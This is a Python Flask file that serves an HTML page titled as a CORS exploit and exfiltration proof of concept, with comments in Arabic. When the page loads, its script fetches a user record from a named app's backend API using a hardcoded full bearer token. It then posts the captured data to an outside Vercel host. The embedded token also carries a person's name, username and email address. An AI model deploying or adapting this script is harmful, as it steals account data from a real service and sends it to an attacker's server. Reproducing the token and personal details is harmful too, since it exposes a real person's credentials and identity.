from flask import Flask, render_template_string, request

app = Flask(__name__)

# هذا الكود يجمع البيانات ويعرضها ثم يرسلها لرابط الـ Vercel الخاص بك
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploit & Exfiltration PoC</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0d1117; color: #58a6ff; padding: 20px; line-height: 1.5; }
        .terminal { background: #161b22; border: 1px solid #30363d; padding: 25px; border-radius: 8px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); }
        .cmd { color: #d2a8ff; font-weight: bold; }
        .output { color: #7ee787; background: #000; padding: 15px; border-radius: 4px; margin-top: 15px; max-height: 400px; overflow: auto; border: 1px solid #333; }
        .error { color: #f85149; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="cmd">root@exploit:~# ./run_cors_attack --target redzapp --exfiltrate-to origin-8d83</div>
        <div id="log-status" style="margin-top:10px;">[+] Initializing request with Bearer Token...</div>
        
        <div class="output" id="response-output">Connecting to API...</div>
        
        <div id="exfiltration-status" style="margin-top:15px; font-weight: bold; color: #d2a8ff;"></div>
    </div>

    <script>
        const targetApi = "https://backend.redzapp.net/api/users/8242?with_follower_status=1&with_following_status=1&with_posts_count=1&with_profile_photo=1";
        const exfiltrateUrl = "https://origin-8d83.vercel.app/";
        
        // الـ Token الكامل كما في طلبك
        const fullToken = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJyQVJGOWFlelBLMnVRdDlIMzRkVUFYVzhQV0lMZU1ZZGgxTHFPUjh1MDdZIn0.eyJleHAiOjE3NzU0NjQxMjcsImlhdCI6MTc3NTQ1ODcyNywianRpIjoiOTkzMzBkNDUtOThlZi00YzAyLWI1ZjItY2UzOTEzMTM3YmVjIiwiaXNzIjoiaHR0cHM6Ly9wcm9kLWtleWNsb2FrLnRhaWw5MDY2Yy50cy5uZXQvcmVhbG1zL21hc3RlciIsImF1ZCI6ImFjY291bnQiLCJzdWIiOiI0MTU1OGJkYy1mZDFkLTQzOGYtYjRlNS00MzQxNjM1ZWYwMzciLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJ4LWFwcCIsInNlc3Npb25fc3RhdGUiOiI5NjhhNjY5OC0yYzJlLTQ0M2EtYWUxOS1mNzI4YjliMWEzODciLCJhY3IiOiIxIiwiYWxsb3dlZC1vcmlnaW5zIjpbIi8qIl0sInJlYWxtX2FjY2VzcyI6eyJyb2xlcyI6WyJkZWZhdWx0LXJvbGVzLW1hc3RlciIsIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6Im9wZW5pZCBwcm9maWxlIGVtYWlsIG9mZmxpbmVfYWNjZXNzIiwic2lkIjoiOTY4YTY2OTgtMmMyZS00NDNhLWFlMTktZjcyOGI5YjFhMzg3IiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOiJBbG5qYWggVW5pdmVyc2l0eSIsInJlZHpfaWQiOjgyNDIsInByZWZlcnJlZF91c2VybmFtZSI6Im9tYWFyIiwiZ2l2ZW5fbmFtZSI6IkFsbmphaCIsImZhbWlseV9uYW1lIjoiVW5pdmVyc2l0eSIsImVtYWlsIjoiYWxuamFodW5pdmVyc2l0eUBnbWFpbC5jb20ifQ.uHxQ8d3YQkNhXGkm1q1ovVNW5xOMj9OC5QLb_YqelZNP0BRuNevcfg2sdjB_fCSdK4PnyrnYwN-pNN68qHMaBp1c-dwGZaqlqjPZhL1t8vrH81kp2eUn44kELwiM6krliXCQSXvK6-1jyP5ucQ_5cLzDca8fZYiB0_czSzioSo8x9PLywoJS_jL75ZZAu1iak1gX2ebx5U1GY5yQYF3RcHmX9WFZ-8WudHRJmkL16gAmzX8u2KLn6t34SfF8Vc8Pkn3J5pD16Bp3fTZTQcqs7IzhnI41p886AdupGT7AiSNBnF0TWbUdPhhGRwhKVkoOERyfAWw7WXenraaxsleofw";

        async function runExploit() {
            const output = document.getElementById('response-output');
            const exfilStatus = document.getElementById('exfiltration-status');
            
            try {
                // الخطوة 1: سرقة البيانات عبر ثغرة CORS
                const res = await fetch(targetApi, {
                    method: 'GET',
                    headers: {
                        'Authorization': fullToken,
                        'X-Device': 'B08DB94D-A940-5BC5-932F-405071BEF14D',
                        'X-App-Version': '4.5.0',
                        'X-Platform': 'ios'
                    },
                    mode: 'cors',
                    credentials: 'include'
                });

                const data = await res.text();
                output.innerText = data;
                document.getElementById('log-status').innerHTML = "[+] Data captured successfully!";

                // الخطوة 2: تسريب البيانات للرابط الخاص بك (Exfiltration)
                exfilStatus.innerText = "[*] Sending captured data to: " + exfiltrateUrl;
                
                await fetch(exfiltrateUrl, {
                    method: 'POST',
                    mode: 'no-cors', // لضمان الإرسال حتى لو كان موقع الاستلام لديه قيود
                    body: JSON.stringify({
                        vulnerability: "CORS Misconfiguration",
                        target: "redzapp",
                        captured_data: data
                    })
                });

                exfilStatus.innerHTML = "[✔] Data exfiltrated to your server successfully!";

            } catch (err) {
                output.innerHTML = "<span class='error'>[!] Error: " + err.message + "</span>";
                exfilStatus.innerText = "";
            }
        }

        window.onload = runExploit;
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

# لضمان عمله على Vercel
app = app
